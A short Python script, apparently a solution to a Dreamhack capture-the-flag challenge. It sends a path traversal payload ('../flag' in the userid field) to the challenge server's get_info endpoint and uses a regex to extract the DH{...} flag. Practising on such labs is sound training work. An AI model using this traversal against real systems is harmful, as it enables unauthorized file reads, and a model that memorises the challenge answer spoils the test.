import re
from requests import request as req

res = req(
    url="http://host8.dreamhack.games:21555/get_info",
    method="POST",
    data={"userid": "../flag"},
)

match = re.match("DH{.*}", res.text)

print(match.group() if match else "NO FLAG")
